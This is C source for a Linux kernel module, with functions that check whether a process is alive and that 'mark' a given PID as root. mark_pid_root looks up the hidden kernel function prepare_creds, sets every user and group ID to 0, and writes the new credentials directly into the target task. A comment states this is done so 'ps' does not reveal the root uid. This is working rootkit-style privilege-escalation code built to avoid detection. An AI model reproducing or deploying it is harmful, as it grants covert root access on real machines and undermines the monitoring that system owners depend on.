//
// Created by fuqiuluo on 24-12-24.
//
#include "hacktask.h"
#include "kallsyms.h"
#include <linux/pid.h>
#include <linux/cred.h>

inline s32 is_pid_alive(pid_t pid) {
    struct pid * pid_struct = find_get_pid(pid);
    if (!pid_struct)
        return false;

    struct task_struct *task = pid_task(pid_struct, PIDTYPE_PID);
    if (!task)
        return false;

    return pid_alive(task);
}

s32 mark_pid_root(pid_t pid) {
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    struct pid * pid_struct = find_get_pid(pid);

    struct task_struct *task = pid_task(pid_struct, PIDTYPE_PID);
    if (task == NULL){
        printk(KERN_ERR "[daat] Failed to get current task info.\n");
        return -1;
    }

    static struct cred* (*my_prepare_creds)(void) = NULL;
    if (my_prepare_creds == NULL) {
        my_prepare_creds = (void *) my_kallsyms_lookup_name("prepare_creds");
        if (my_prepare_creds == NULL) {
            printk(KERN_ERR "[daat] Failed to find prepare_creds\n");
            return -1;
        }
    }

    struct cred *new_cred = my_prepare_creds();
    if (new_cred == NULL) {
        printk(KERN_ERR "[daat] Failed to prepare new credentials\n");
        return -ENOMEM;
    }
    new_cred->uid = kuid;
    new_cred->gid = kgid;
    new_cred->euid = kuid;
    new_cred->egid = kgid;

    // Dirty creds assignment so "ps" doesn't show the root uid!
    // If one uses commit_creds(new_cred), not only this would only affect
    // the current calling task but would also display the new uid (more visible).
    // rcu_assign_pointer is taken from the commit_creds source code (kernel/cred.c)
    rcu_assign_pointer(task->cred, new_cred);
    return 0;
}